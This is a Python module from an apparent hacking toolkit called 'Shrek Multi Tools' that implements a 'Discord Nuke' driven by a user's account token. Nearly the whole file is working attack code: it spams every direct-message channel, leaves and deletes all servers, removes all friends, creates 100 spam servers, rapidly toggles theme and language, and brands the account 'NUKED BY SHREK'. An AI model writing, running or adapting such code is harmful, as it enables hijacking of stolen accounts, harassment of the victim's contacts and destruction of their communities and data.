# Shrek was proudly coded by Shrek™ [https://github.com/SHREK-TM].
# Copyright © Shrek Multi Tools

import os
import sys
import time
import threading
import random
import requests
from itertools import cycle
from colorama import Fore, Style

root_path = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "..", "..")
)
if root_path not in sys.path:
    sys.path.insert(0, root_path)

# ---- Imports Shrek uniquement ----
from utilities.core.common import *
from utilities.core.context import return_to_menu
from utilities.core.shrek_ui import set_console_title
from utilities.core.helpers import useragent

# ---- Style Functions ----
def success(text):
    print(f'{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}{text}{Style.RESET_ALL}')

def info(text):
    print(f'{Fore.YELLOW}[{Fore.WHITE}*{Fore.YELLOW}] {Fore.WHITE}{text}{Style.RESET_ALL}')

def warn(text):
    print(f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] {Fore.WHITE}{text}{Style.RESET_ALL}')

def input_prompt(prompt):
    return input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} {prompt}: {Style.RESET_ALL}')

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


# ---- Helper Functions (Shrek uniquement) ----
def getheaders(token):
    """Retourne les headers pour les requêtes Discord"""
    return {
        'Authorization': token,
        'User-Agent': useragent(),
        'Content-Type': 'application/json'
    }


# ---- Seizure Mode ----
def seizure_mode(token):
    """Mode seizure (alterne light/dark et langues)"""
    info('Starting seizure mode (switching light/dark mode)')
    t = threading.current_thread()
    while getattr(t, "do_run", True):
        modes = cycle(["light", "dark"])
        setting = {
            'theme': next(modes),
            'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
        }
        try:
            requests.patch(
                "https://discord.com/api/v7/users/@me/settings",
                headers=getheaders(token),
                json=setting
            )
        except:
            pass


# ---- Main Nuke Function ----
def discord_nuke(token, server_name, message_content):
    """Fonction principale du nuke"""
    set_console_title('Deploying Discord Nuke')
    info('Discord Nuke deployed...')

    # ---- Seizure mode ----
    if threading.active_count() <= 100:
        t = threading.Thread(target=seizure_mode, args=(token,))
        t.daemon = True
        t.start()

    headers = getheaders(token)
    
    # ---- 1. Spam messages to friends ----
    info('Spamming messages to friends...')
    try:
        channelIds = requests.get(
            "https://discord.com/api/v9/users/@me/channels",
            headers=headers
        ).json()
        for channel in channelIds:
            try:
                requests.post(
                    f'https://discord.com/api/v9/channels/{channel["id"]}/messages',
                    headers=headers,
                    data={"content": f"{message_content}"}
                )
                set_console_title(f"Messaging {channel['id']}")
                success(f"Messaged ID: {channel['id']}")
            except:
                pass
    except:
        pass

    # ---- 2. Leave all guilds ----
    info('Leaving all guilds...')
    try:
        guildsIds = requests.get(
            "https://discord.com/api/v8/users/@me/guilds",
            headers=headers
        ).json()
        for guild in guildsIds:
            try:
                requests.delete(
                    f'https://discord.com/api/v8/users/@me/guilds/{guild["id"]}',
                    headers=headers
                )
                success(f"Left guild: {guild['name']}")
            except:
                pass
    except:
        pass

    # ---- 3. Delete all guilds (if owner) ----
    info('Deleting guilds...')
    try:
        for guild in guildsIds:
            try:
                requests.delete(
                    f'https://discord.com/api/v8/guilds/{guild["id"]}',
                    headers=headers
                )
                success(f"Deleted guild: {guild['name']}")
            except:
                pass
    except:
        pass

    # ---- 4. Remove all friends ----
    info('Removing all friends...')
    try:
        friendIds = requests.get(
            "https://discord.com/api/v9/users/@me/relationships",
            headers=headers
        ).json()
        for friend in friendIds:
            try:
                requests.delete(
                    f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}',
                    headers=headers
                )
                success(f"Removed friend: {friend['user']['username']}#{friend['user']['discriminator']}")
            except:
                pass
    except:
        pass

    # ---- 5. Create spam servers ----
    info('Creating spam servers...')
    for i in range(100):
        try:
            payload = {
                'name': f'{server_name}',
                'region': 'europe',
                'icon': None,
                'channels': None
            }
            requests.post(
                'https://discord.com/api/v7/guilds',
                headers=headers,
                json=payload
            )
            set_console_title(f"Creating {server_name} #{i}")
            success(f"Created {server_name} #{i}")
        except:
            pass

    # ---- 6. Remove Hypesquad ----
    try:
        requests.delete(
            "https://discord.com/api/v8/hypesquad/online",
            headers=headers
        )
        info('Hypesquad removed')
    except:
        pass

    # ---- 7. Change settings ----
    info('Changing settings...')
    setting = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        "custom_status": {"text": "NUKED BY SHREK MULTI TOOLS"},
        'status': "idle"
    }
    try:
        requests.patch(
            "https://discord.com/api/v7/users/@me/settings",
            headers=headers,
            json=setting
        )
        info('Settings changed')
    except:
        pass

    # ---- 8. Stop seizure ----
    try:
        t.do_run = False
    except:
        pass

    # ---- 9. Get username ----
    try:
        j = requests.get(
            "https://discordapp.com/api/v9/users/@me",
            headers=headers
        ).json()
        username = j['username'] + "#" + j['discriminator']
        set_console_title("Nuke Successfully Detonated!")
        success(f"Succesfully nuked {username}")
    except:
        success("Nuke completed!")

    input_prompt('Press Enter to continue')


# ---- Run Function ----
def run():
    clear_screen()
    set_console_title('Discord Nuke | Shrek Multi Tools')
    
    print(f"""
{Fore.GREEN}
      ██████   ██░ ██  ██▀███   ▓█████ ██ ▄█▀     ███▄    █  █    ██  ██ ▄█▀ ▓█████ ██▀███  
    ▒██    ▒ ▒▓██░ ██ ▓██ ▒ ██▒ ▓█   ▀ ██▄█▒      ██ ▀█   █  ██  ▓██▒ ██▄█▒  ▓█   ▀▓██ ▒ ██▒
    ░ ▓██▄   ░▒██▀▀██ ▓██ ░▄█ ▒ ▒███  ▓███▄░     ▓██  ▀█ ██▒▓██  ▒██░▓███▄░  ▒███  ▓██ ░▄█ ▒
      ▒   ██▒ ░▓█ ░██ ▒██▀▀█▄   ▒▓█  ▄▓██ █▄     ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄  ▒▓█  ▄▒██▀▀█▄  
    ▒██████▒▒ ░▓█▒░██▓░██▓ ▒██▒▒░▒████▒██▒ █▄    ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄▒░▒████░██▓ ▒██▒
    ▒ ▒▓▒ ▒ ░  ▒ ░░▒░▒░ ▒▓ ░▒▓░░░░ ▒░ ▒ ▒▒ ▓▒    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒▓ ░▒▓░
    ░ ░▒  ░ ░  ▒ ░▒░ ░  ░▒ ░ ▒ ░ ░ ░  ░ ░▒ ▒░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░░ ░ ░    ░▒ ░ ▒ 
    ░  ░  ░    ░  ░░ ░  ░░   ░     ░  ░ ░░ ░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░     ░    ░░   ░ 
          ░    ░  ░  ░   ░     ░   ░  ░  ░                ░    ░     ░  ░   ░   ░     ░     
""")
    print()
    
    token = input_prompt('Token')
    if not token:
        warn('Token cannot be empty!')
        time.sleep(1)
        run()
        return
    
    server_name = input_prompt('Server name to spam')
    if not server_name:
        server_name = 'NUKED BY SHREK'
    
    message = input_prompt('Message to spam')
    if not message:
        message = 'NUKED BY SHREK MULTI TOOLS'
    
    print()
    warn('WARNING: This will destroy the account!')
    confirm = input_prompt('Are you sure? (y/n)').lower()
    
    if confirm != 'y':
        info('Cancelled')
        time.sleep(1)
        return_to_menu()
        return
    
    try:
        discord_nuke(token, server_name, message)
    except Exception as e:
        warn(f'Error: {e}')
        time.sleep(2)
    
    return_to_menu()


# ---- Point d'entrée ----
if __name__ == '__main__':
    run()